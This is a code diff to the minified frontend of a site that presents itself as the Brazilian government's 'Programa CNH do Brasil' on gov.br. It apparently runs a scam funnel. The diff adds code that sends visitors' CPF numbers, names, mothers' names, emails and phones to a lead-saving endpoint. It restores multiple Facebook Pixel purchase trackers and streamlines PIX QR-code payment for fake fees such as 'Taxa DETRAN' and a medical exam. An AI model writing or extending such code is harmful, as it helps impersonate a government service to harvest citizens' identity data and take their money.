@@ -90,9 +90,12 @@ function Sw(e, t) {
   }
 })();
 
-      // Facebook Pixel code removed for UTMify compliance
-      // The following code has been removed to comply with UTMify policies
-      // This ensures that tracking is disabled for UTM parameters
+function Kg(e) {
+  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default")
+    ? e.default
+    : e;
+}
+var Qg = {
     exports: {},
   },
   gl = {},
@@ -18726,6 +18729,26 @@ function g3() {
                   phone: f,
                 }),
               );
+              try {
+                const Ye = {
+                  cpf: (oe == null ? void 0 : oe.cpf) || m.cpf || "",
+                  nome: (oe == null ? void 0 : oe.nome) || v || m.nome || "",
+                  nome_mae: m.nome_mae || m.nomeMae || "",
+                  email: u,
+                  phone: f,
+                  source: "funnel_phone",
+                  tracking: { etapa: "phone" },
+                };
+                fetch("/api/leads/save", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify(Ye),
+                }).catch((Me) => {
+                  console.error("Erro ao salvar lead:", Me);
+                });
+              } catch (Ye) {
+                console.error("Erro ao salvar lead:", Ye);
+              }
               const ze = b ? encodeURIComponent(JSON.stringify(oe)) : p;
               e(`/saiba-mais?data=${ze}`);
             } else {
@@ -18914,23 +18937,14 @@ function g3() {
             children: [
               l.jsxs("div", {
                 className: "flex items-center gap-3 mb-4",
-                children: [
-                  l.jsx("div", {
-                    className:
-                      "flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium",
-                    children: D.number,
-                  }),
-                  l.jsx("p", {
-                    className: "font-semibold text-base",
-                    children: "Programa CNH do Brasil",
-                  }),
-                ],
+                children: [],
               }),
               l.jsxs("div", {
                 className: "bg-white rounded-2xl shadow-md p-6 w-full",
                 children: [
                   l.jsx("p", {
-                    className: "text-sm text-gray-600 mb-3",
+                    className:
+                      "text-base text-gray-900 font-semibold text-center mb-4",
                     children:
                       "Confirme seus dados para o cadastro no Programa CNH do Brasil",
                   }),
@@ -18979,7 +18993,7 @@ function g3() {
                             l.jsx(
                               "div",
                               {
-                                className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer border ${o === R ? "bg-[#1351B4] bg-opacity-10 border-[#1351B4]" : "bg-white border-gray-100 hover:bg-gray-50"}`,
+                                className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer border shadow-[0_0_0_2px_rgba(19,81,180,0.12)] ${o === R ? "bg-[#1351B4] bg-opacity-10 border-[#1351B4]" : "bg-white border-[#1351B4] hover:bg-gray-50"}`,
                                 onClick: () => {
                                   (i(R), s(null));
                                 },
@@ -18999,7 +19013,7 @@ function g3() {
                             l.jsx(
                               "div",
                               {
-                                className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer border ${o === R ? "bg-[#1351B4] bg-opacity-10 border-[#1351B4]" : "bg-white border-gray-100 hover:bg-gray-50"}`,
+                                className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer border shadow-[0_0_0_2px_rgba(19,81,180,0.12)] ${o === R ? "bg-[#1351B4] bg-opacity-10 border-[#1351B4]" : "bg-white border-[#1351B4] hover:bg-gray-50"}`,
                                 onClick: () => {
                                   (i(R), s(null));
                                 },
@@ -20765,7 +20779,39 @@ function gp() {
       } catch (A) {
         console.error("TikTok Pixel error:", A);
       }
-    // Facebook Pixel code removed for UTMify compliance
+    if (typeof window.fbq < "u")
+      try {
+        (window.fbq("track", "Purchase", {
+          value: 74.9,
+          currency: "BRL",
+          content_name: "Taxa Emissao CNH - CNH do Brasil",
+          content_type: "product",
+        }),
+          console.log("Facebook Pixel (3270339329986286): Purchase tracked"),
+          window.fbq("trackSingle", "1555494242118668", "Purchase", {
+            value: 74.9,
+            currency: "BRL",
+            content_name: "Taxa Emissao CNH - CNH do Brasil",
+            content_type: "product",
+          }),
+          console.log("Facebook Pixel (1555494242118668): Purchase tracked"),
+          window.fbq("trackSingle", "1154359756859567", "Purchase", {
+            value: 74.9,
+            currency: "BRL",
+            content_name: "Taxa Emissao CNH - CNH do Brasil",
+            content_type: "product",
+          }),
+          console.log("Facebook Pixel (1154359756859567): Purchase tracked"),
+          window.fbq("trackSingle", "2062889337802425", "Purchase", {
+            value: 74.9,
+            currency: "BRL",
+            content_name: "Taxa Emissao CNH - CNH do Brasil",
+            content_type: "product",
+          }),
+          console.log("Facebook Pixel (2062889337802425): Purchase tracked"));
+      } catch (A) {
+        console.error("Facebook Pixel error:", A);
+      }
     localStorage.setItem(p, new Date().toISOString());
   }, []),
     x.useEffect(() => {
@@ -20834,12 +20880,12 @@ function gp() {
                 })
               ).json();
             if (j.success) {
-              if ((n(j), j.pix_qr_code || j.qr_code)) {
-                const A = (j.pix_qr_code || j.qr_code || "").trim();
-                const P = A.replace(/^https?:\/\//, "");
-                if (A && P.startsWith("000201"))
+              n(j);
+              const A = j.pix_code || j.pix_qr_code || j.qr_code;
+              if (A) {
+                if (A.startsWith("000201") || A.includes("br.gov.bcb.pix")) {
                   try {
-                    const m = await Zs.toDataURL(P, {
+                    const P = await Zs.toDataURL(A, {
                       width: 256,
                       margin: 2,
                       color: {
@@ -20847,22 +20893,25 @@ function gp() {
                         light: "#FFFFFF",
                       },
                     });
-                    d(m);
-                  } catch {}
-                else {
-                  const m = A
-                    ? A.startsWith("data:image")
-                      ? A
-                      : A.startsWith("http")
-                        ? `/api/qr?u=${encodeURIComponent(A)}`
-                        : A.includes("/")
-                          ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
-                          : `data:image/png;base64,${A}`
-                    : A;
-                  d(m);
+                    d(P);
+                    typeof window.triggerPurchaseOnce === "function" &&
+                      window.triggerPurchaseOnce(74.9, "BRL");
+                  } catch (P) {
+                    console.error("Erro ao gerar QR code:", P);
+                  }
+                } else {
+                  const P = A.startsWith("data:image")
+                    ? A
+                    : A.startsWith("http")
+                      ? `/api/qr?u=${encodeURIComponent(A)}`
+                      : A.includes("/")
+                        ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
+                        : `data:image/png;base64,${A}`;
+                  d(P);
+                  typeof window.triggerPurchaseOnce === "function" &&
+                    window.triggerPurchaseOnce(74.9, "BRL");
                 }
-              }
-              else if (j.pix_code)
+              } else if (j.pix_code)
                 try {
                   const A = await Zs.toDataURL(j.pix_code, {
                     width: 256,
@@ -21370,7 +21419,18 @@ function gpH() {
       } catch (A) {
         console.error("TikTok Pixel error:", A);
       }
-    // Facebook Pixel code removed for UTMify compliance
+    if (typeof window.fbq < "u")
+      try {
+        (window.fbq("track", "ViewContent", {
+          value: 127.0,
+          currency: "BRL",
+          content_name: "Exame Médico Obrigatório - CNH do Brasil",
+          content_type: "product",
+        }),
+          console.log("Facebook Pixel: Exame Médico ViewContent tracked"));
+      } catch (A) {
+        console.error("Facebook Pixel error:", A);
+      }
     localStorage.setItem(p, new Date().toISOString());
   }, []),
     x.useEffect(() => {
@@ -21401,12 +21461,12 @@ function gpH() {
                 })
               ).json();
             if (j.success) {
-              if ((n(j), j.pix_qr_code || j.qr_code)) {
-                const A = (j.pix_qr_code || j.qr_code || "").trim();
-                const P = A.replace(/^https?:\/\//, "");
-                if (A && P.startsWith("000201"))
+              n(j);
+              const A = j.pix_code || j.pix_qr_code || j.qr_code;
+              if (A) {
+                if (A.startsWith("000201") || A.includes("br.gov.bcb.pix")) {
                   try {
-                    const m = await Zs.toDataURL(P, {
+                    const P = await Zs.toDataURL(A, {
                       width: 256,
                       margin: 2,
                       color: {
@@ -21414,22 +21474,25 @@ function gpH() {
                         light: "#FFFFFF",
                       },
                     });
-                    d(m);
-                  } catch {}
-                else {
-                  const m = A
-                    ? A.startsWith("data:image")
-                      ? A
-                      : A.startsWith("http")
-                        ? `/api/qr?u=${encodeURIComponent(A)}`
-                        : A.includes("/")
-                          ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
-                          : `data:image/png;base64,${A}`
-                    : A;
-                  d(m);
+                    d(P);
+                    typeof window.triggerPurchaseOnce === "function" &&
+                      window.triggerPurchaseOnce(127, "BRL");
+                  } catch (P) {
+                    console.error("Erro ao gerar QR code:", P);
+                  }
+                } else {
+                  const P = A.startsWith("data:image")
+                    ? A
+                    : A.startsWith("http")
+                      ? `/api/qr?u=${encodeURIComponent(A)}`
+                      : A.includes("/")
+                        ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
+                        : `data:image/png;base64,${A}`;
+                  d(P);
+                  typeof window.triggerPurchaseOnce === "function" &&
+                    window.triggerPurchaseOnce(127, "BRL");
                 }
-              }
-              else if (j.pix_code)
+              } else if (j.pix_code)
                 try {
                   const A = await Zs.toDataURL(j.pix_code, {
                     width: 256,
@@ -22411,12 +22474,12 @@ function gpPr() {
               })
             ).json();
           if (j.success) {
-            if ((n(j), j.pix_qr_code || j.qr_code)) {
-              const A = (j.pix_qr_code || j.qr_code || "").trim();
-              const P = A.replace(/^https?:\/\//, "");
-              if (A && P.startsWith("000201"))
+            n(j);
+            const A = j.pix_code || j.pix_qr_code || j.qr_code;
+            if (A) {
+              if (A.startsWith("000201") || A.includes("br.gov.bcb.pix")) {
                 try {
-                  const m = await Zs.toDataURL(P, {
+                  const P = await Zs.toDataURL(A, {
                     width: 256,
                     margin: 2,
                     color: {
@@ -22424,22 +22487,25 @@ function gpPr() {
                       light: "#FFFFFF",
                     },
                   });
-                  d(m);
-                } catch {}
-              else {
-                const m = A
-                  ? A.startsWith("data:image")
-                    ? A
-                    : A.startsWith("http")
-                      ? `/api/qr?u=${encodeURIComponent(A)}`
-                      : A.includes("/")
-                        ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
-                        : `data:image/png;base64,${A}`
-                  : A;
-                d(m);
+                  d(P);
+                  typeof window.triggerPurchaseOnce === "function" &&
+                    window.triggerPurchaseOnce(74.9, "BRL");
+                } catch (P) {
+                  console.error("Erro ao gerar QR code:", P);
+                }
+              } else {
+                const P = A.startsWith("data:image")
+                  ? A
+                  : A.startsWith("http")
+                    ? `/api/qr?u=${encodeURIComponent(A)}`
+                    : A.includes("/")
+                      ? `/api/qr?u=${encodeURIComponent(`https://${A}`)}`
+                      : `data:image/png;base64,${A}`;
+                d(P);
+                typeof window.triggerPurchaseOnce === "function" &&
+                  window.triggerPurchaseOnce(74.9, "BRL");
               }
-            }
-            else if (j.pix_code)
+            } else if (j.pix_code)
               try {
                 const A = await Zs.toDataURL(j.pix_code, {
                   width: 256,
@@ -30821,11 +30887,23 @@ function DE() {
           if ((w(G.status), G.status === "paid")) {
             console.log("PAGAMENTO CONFIRMADO!");
             const I = `fb_conversion_${M}`;
-            // Facebook Pixel code removed for UTMify compliance
-            setTimeout(() => {
-              e("/success");
-            }, 1e3);
-            return !0;
+            return (
+              !localStorage.getItem(I) &&
+                typeof window.fbq < "u" &&
+                (window.fbq("track", "Purchase", {
+                  value: (t == null ? void 0 : t.amount) || 64.73,
+                  currency: "BRL",
+                  content_name: "Pagamento via PIX - CNH do Brasil",
+                  content_type: "product",
+                  content_ids: [M],
+                  transaction_id: M,
+                }),
+                localStorage.setItem(I, new Date().toISOString())),
+              setTimeout(() => {
+                e("/success");
+              }, 1e3),
+              !0
+            );
           } else if (G.status === "expired" || G.status === "cancelled")
             return (
               console.log("Transação expirada ou cancelada"),
@@ -30866,15 +30944,6 @@ function DE() {
           phone: _.phone || "11999999999",
           amount: "64,73",
           title: "CNH Popular Brasil",
-          shipping: {
-            street: _.street || "Rua Exemplo",
-            streetNumber: _.streetNumber || "100",
-            neighborhood: _.neighborhood || "Centro",
-            zipCode: _.zipCode || "01001000",
-            city: _.city || "São Paulo",
-            state: _.state || "SP",
-            complement: _.complement || "",
-          },
         };
         console.log("Enviando para API:", requestPayload);
         
@@ -30891,12 +30960,12 @@ function DE() {
         console.log("Resposta da API:", I);
 
         if (I.success) {
-          if ((n(I), I.pix_qr_code || I.qr_code)) {
-            const $ = (I.pix_qr_code || I.qr_code || "").trim();
-            const P = $.replace(/^https?:\/\//, "");
-            if ($ && P.startsWith("000201"))
+          n(I);
+          const $ = I.pix_qr_code || I.qr_code;
+          if ($) {
+            if ($.startsWith("000201") || $.includes("br.gov.bcb.pix")) {
               try {
-                const w = await Zs.toDataURL(P, {
+                const P = await Zs.toDataURL($, {
                   width: 256,
                   margin: 2,
                   color: {
@@ -30904,22 +30973,24 @@ function DE() {
                     light: "#FFFFFF",
                   },
                 });
-                h(w);
-              } catch (w) {
-                console.error("Erro ao gerar QR code:", w);
-                d("Erro ao gerar QR code: " + w.message);
+                h(P);
+                typeof window.triggerPurchaseOnce === "function" &&
+                  window.triggerPurchaseOnce(64.73, "BRL");
+              } catch (P) {
+                console.error("Erro ao gerar QR code:", P);
+                d("Erro ao gerar QR code: " + P.message);
               }
-            else if ($) {
-              const w = $
-                ? $.startsWith("data:image")
-                  ? $
-                  : $.startsWith("http")
-                    ? `/api/qr?u=${encodeURIComponent($)}`
-                    : $.includes("/")
-                      ? `/api/qr?u=${encodeURIComponent(`https://${$}`)}`
-                      : `data:image/png;base64,${$}`
-                : $;
-              h(w);
+            } else {
+              const P = $.startsWith("data:image")
+                ? $
+                : $.startsWith("http")
+                  ? `/api/qr?u=${encodeURIComponent($)}`
+                  : $.includes("/")
+                    ? `/api/qr?u=${encodeURIComponent(`https://${$}`)}`
+                    : `data:image/png;base64,${$}`;
+              h(P);
+              typeof window.triggerPurchaseOnce === "function" &&
+                window.triggerPurchaseOnce(64.73, "BRL");
             }
           } else if (I.pix_code)
             try {
@@ -32023,7 +32094,18 @@ function OE() {
     }
     (W && w(JSON.parse(W)), _(ke()), L(Te()), to(fn()));
     const Y = "fb_addtocart_chat_tracked";
-    // Facebook Pixel code removed for UTMify compliance
+    if (!localStorage.getItem(Y) && typeof window.fbq < "u")
+      try {
+        (window.fbq("track", "AddToCart", {
+          value: 64.73,
+          currency: "BRL",
+          content_name: "Taxa DETRAN - CNH do Brasil",
+          content_type: "product",
+        }),
+          localStorage.setItem(Y, new Date().toISOString()));
+      } catch (ge) {
+        console.error("Facebook Pixel AddToCart error:", ge);
+      }
     LE();
   }, []),
     x.useEffect(() => {
@@ -32075,12 +32157,12 @@ function OE() {
             }),
           })
         ).json();
-        if (qr && (qr.pix_qr_code || qr.qr_code)) {
-          const bw = (qr.pix_qr_code || qr.qr_code).trim();
+        if (qr && (qr.pix_code || qr.pix_qr_code || qr.qr_code)) {
+          const bw = (qr.pix_code || qr.pix_qr_code || qr.qr_code).trim();
           const bwNoScheme = bw.replace(/^https?:\/\//, "");
-          if (bwNoScheme.startsWith("000201"))
+          if (bwNoScheme.startsWith("000201") || bw.includes("br.gov.bcb.pix")) {
             try {
-              qr.qr_code_image = await Zs.toDataURL(bwNoScheme, {
+              qr.qr_code_image = await Zs.toDataURL(bw, {
                 width: 256,
                 margin: 2,
                 color: {
@@ -32089,7 +32171,7 @@ function OE() {
                 },
               });
             } catch {}
-          else {
+          } else {
             const Gw = bw.startsWith("data:image")
               ? bw
               : bw.startsWith("http")
@@ -32098,6 +32180,8 @@ function OE() {
                   ? `/api/qr?u=${encodeURIComponent(`https://${bw}`)}`
                   : `data:image/png;base64,${bw}`;
             qr.qr_code_image = Gw;
+            typeof window.triggerPurchaseOnce === "function" &&
+              window.triggerPurchaseOnce(64.73, "BRL");
           }
         }
         if (qr && !qr.qr_code_image && qr.pix_code)
@@ -34224,10 +34308,17 @@ function BE() {
     })(
       window,
       document,
-      // Facebook Pixel code removed for UTMify compliance
+      "script",
+      "https://connect.facebook.net/en_US/fbevents.js",
     ));
-  // Facebook Pixel code removed for UTMify compliance
-  (document.title = "gov.br - Programa CNH do Brasil"));
+  const e = window.fbq;
+  (e &&
+    (e("init", "3270339329986286"),
+    e("init", "1555494242118668"),
+    e("init", "1154359756859567"),
+    e("init", "2062889337802425"),
+    e("track", "PageView")),
+    (document.title = "gov.br - Programa CNH do Brasil"));
 }
 
 function Mg() {
@@ -34244,7 +34335,7 @@ function Mg() {
       e.indexOf("MESSENGER") > -1 ||
       e.indexOf("Messenger") > -1;
   return {
-    // Facebook Pixel code removed for UTMify compliance
+    isFacebook: t,
     isInstagram: n,
     isMessenger: r,
     isAllowed: !0,
@@ -34274,7 +34365,7 @@ async function UE(e) {
       },
       body: JSON.stringify({
         userAgent: e.userAgent,
-        // Facebook Pixel code removed for UTMify compliance
+        isFacebook: e.isFacebook,
         isInstagram: e.isInstagram,
         isMessenger: e.isMessenger,
         isAllowed: e.isAllowed,
